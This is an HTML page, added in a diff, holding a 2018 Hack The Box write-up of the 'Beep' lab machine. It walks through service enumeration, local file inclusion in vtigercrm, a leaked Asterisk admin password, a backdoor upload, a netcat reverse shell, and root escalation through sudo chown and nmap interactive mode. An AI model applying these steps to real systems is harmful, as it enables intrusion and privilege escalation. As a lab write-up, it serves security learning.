@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>Beep Writeup | Syrion</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/main.css">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    <script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-69613510-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+    <link rel="shortcut icon" href="/images/favicon.png">
+
+    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <h1 class="">Syrion</h1>
+    <!--
+    <p>
+    <span class="reserved">char</span> nick[<span class="number">9</span>] = <span class="string">"syrion89"</span>;
+    </p>
+    <p>
+    printf(<a href="https://github.com/syrion89" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
+    </p>
+    <p>
+    printf(<span class="string">"<span class="reserved">%s\x40</span>protonmail<span class="reserved">\x2e\\\b</span>ch<span class="reserved">\n</span>"</span>,nick);
+    </p>
+     <p>
+            printf(<a href="https://syrion89.wordpress.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.wordpress.com<span class="reserved">\n</span>"</span></a>,nick);
+        </p> -->
+    <p>
+    <span class="string">Penetration Testing And CTF Blog</span>
+    </p>
+  </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu">
+      <ul>
+          <li><a href="/">Home</a></li>
+         <!-- <li><a href="/blog">blog</a></li> -->
+          <li><a href="/whoami">Whoami</a></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+
+  <header class="post-header">
+    <h1>Beep Writeup</h1>
+  </header>
+
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header">
+    <p class="meta">
+        Jan 7, 2018
+        
+        
+        •
+        <span><a href="/category/#hackthebox" class="reserved">hackthebox</a></span>
+    </p>
+  </header>
+
+  <article class="post-content">
+  <p>Hello,</p>
+
+<p>this is my first writeup for Hack The Box platform, the machine was <a href="https://www.hackthebox.eu/home/machines/profile/5">Beep</a>.</p>
+
+<p>Let’s run nmap to see which services are running on the machine:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-08 12:27 EST
+Nmap scan report for beep.localdomain (10.10.10.7)
+Host is up (0.087s latency).
+Not shown: 65519 closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
+25/tcp    open  smtp       Postfix smtpd
+80/tcp    open  http       Apache httpd 2.2.3
+110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+111/tcp   open  rpcbind    2 (RPC #100000)
+143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
+443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
+746/tcp   open  status     1 (RPC #100024)
+993/tcp   open  ssl/imap   Cyrus imapd
+995/tcp   open  pop3       Cyrus pop3d
+3306/tcp  open  mysql      MySQL (unauthorized)
+4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
+4445/tcp  open  upnotifyp?
+4559/tcp  open  hylafax    HylaFAX 4.3.10
+5038/tcp  open  asterisk   Asterisk Call Manager 1.1
+10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
+Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
+</code></pre></div></div>
+
+<p>There were a lot of services.</p>
+
+<p>On port 443 there was Apache with elastix:</p>
+
+<p><img src="/images/posts/2018/2018-01-08-htb-beep/img1.png" alt="Screenshot" /></p>
+
+<p>By using dirsearch I enumerated it’s directories:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: php, txt | Threads: 10 | Wordlist size: 30005
+
+Error Log: /opt/dirsearch/logs/errors-18-01-08_15-16-00.log
+
+Target: https://10.10.10.7/
+
+[15:16:01] Starting: 
+[15:16:02] 301 -  309B  - /admin  -&gt;  https://10.10.10.7/admin/
+[15:16:02] 301 -  310B  - /images  -&gt;  https://10.10.10.7/images/
+[15:16:02] 301 -  311B  - /modules  -&gt;  https://10.10.10.7/modules/
+[15:16:02] 301 -  310B  - /themes  -&gt;  https://10.10.10.7/themes/
+[15:16:03] 301 -  308B  - /help  -&gt;  https://10.10.10.7/help/
+[15:16:05] 301 -  307B  - /var  -&gt;  https://10.10.10.7/var/
+[15:16:05] 301 -  308B  - /mail  -&gt;  https://10.10.10.7/mail/
+[15:16:06] 301 -  310B  - /static  -&gt;  https://10.10.10.7/static/
+[15:16:07] 301 -  308B  - /lang  -&gt;  https://10.10.10.7/lang/
+[15:16:10] 301 -  308B  - /libs  -&gt;  https://10.10.10.7/libs/
+[15:16:19] 301 -  309B  - /panel  -&gt;  https://10.10.10.7/panel/
+[15:16:58] 301 -  311B  - /configs  -&gt;  https://10.10.10.7/configs/
+[15:23:39] 301 -  314B  - /recordings  -&gt;  https://10.10.10.7/recordings/
+[15:26:38] 301 -  313B  - /vtigercrm  -&gt;  https://10.10.10.7/vtigercrm/
+[15:26:42] 200 -    2KB - /
+</code></pre></div></div>
+
+<p>I found vtigercrm 5.1.0:</p>
+
+<p><img src="/images/posts/2018/2018-01-08-htb-beep/img2.png" alt="Screenshot" /></p>
+
+<p>This version is vulnerable to LFI.
+With <a href="https://github.com/dzonerzy/goWAPT">goWAPT</a> I enumerated all the files:</p>
+
+<p><img src="/images/posts/2018/2018-01-08-htb-beep/img3.png" alt="Screenshot" /></p>
+
+<p>In the /etc/passwd file we can see the user Fanis:</p>
+
+<p><img src="/images/posts/2018/2018-01-08-htb-beep/img4.png" alt="Screenshot" /></p>
+
+<p>After some research on google about asterisk, I got the etc/asterisk/manager.conf file:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;
+; AMI - Asterisk Manager interface
+;
+; FreePBX needs this to be enabled. Note that if you enable it on a different IP, you need
+; to assure that this can't be reached from un-authorized hosts with the ACL settings (permit/deny).
+; Also, remember to configure non-default port or IP-addresses in amportal.conf.
+; 
+; The AMI connection is used both by the portal and the operator's panel in FreePBX.
+;
+; FreePBX assumes an AMI connection to localhost:5038 by default.
+;
+[general]
+enabled = yes
+port = 5038
+bindaddr = 0.0.0.0
+displayconnects=no ;only effects 1.6+
+
+[admin]
+secret = jEhdIekWmdjE
+deny=0.0.0.0/0.0.0.0
+permit=127.0.0.1/255.255.255.0
+read = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate
+write = system,call,log,verbose,command,agent,user,config,command,dtmf,reporting,cdr,dialplan,originate
+
+#include manager_additional.conf
+#include manager_custom.conf
+</code></pre></div></div>
+
+<p>I used the credential admin:jEhdIekWmdjE contained in this file to log in Elastix, Vtigercrm and FreePBX.</p>
+
+<p>After some research on Google, I was able to upload a backdoor by using this <a href="https://www.exploit-db.com/exploits/38345/">vulnerability</a> in vtiger crm:</p>
+
+<p><img src="/images/posts/2018/2018-01-08-htb-beep/img5.png" alt="Screenshot" /></p>
+
+<p>With python I got a reverse shell and the user flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/webshell# nc -lvp 80
+listening on [any] 80 ...
+connect to [10.10.14.6] from beep.localdomain [10.10.10.7] 46497
+sh: no job control in this shell
+sh-3.2$ ls
+logo.txt
+sale.jpeg
+vtiger-crm-logo.jpg
+webshell.php
+sh-3.2$ python -c "import pty;pty.spawn('/bin/bash')"
+bash-3.2$ cat /home/fanis/user.txt
+cat /home/fanis/user.txt
+</code></pre></div></div>
+
+<p>There were different ways to get the root flag:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2$ sudo -l
+sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY"
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+bash-3.2$ sudo /bin/chown -r asterisk /root
+sudo /bin/chown -r asterisk /root
+/bin/chown: invalid option -- r
+Try `/bin/chown --help' for more information.
+bash-3.2$ sudo /bin/chown -R asterisk /root
+sudo /bin/chown -R asterisk /root
+bash-3.2$ cat /root/root.txt
+cat /root/root.txt
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.2$ sudo nmap --interactive
+sudo nmap --interactive
+
+Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !id
+!id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+waiting to reap child: No child processes (10)
+nmap&gt;
+</code></pre></div></div>
+
+<p>Bye!!!</p>
+
+  </article>
+
+	<!--<p class="feed-recomendation">
+		Gostou do post? Assina o <a href="feed/">feed</a> e seja feliz!!
+	</p>
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'syrion89';
+    var disqus_config = function () {
+        this.page.identifier = "/blog/htb-beep/";
+    };
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+-->
+
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <footer>
+      Syrion © 2018 
+    </footer>
+  </div>
+</div>
+
+
+      </div>
+    </body>
+</html>
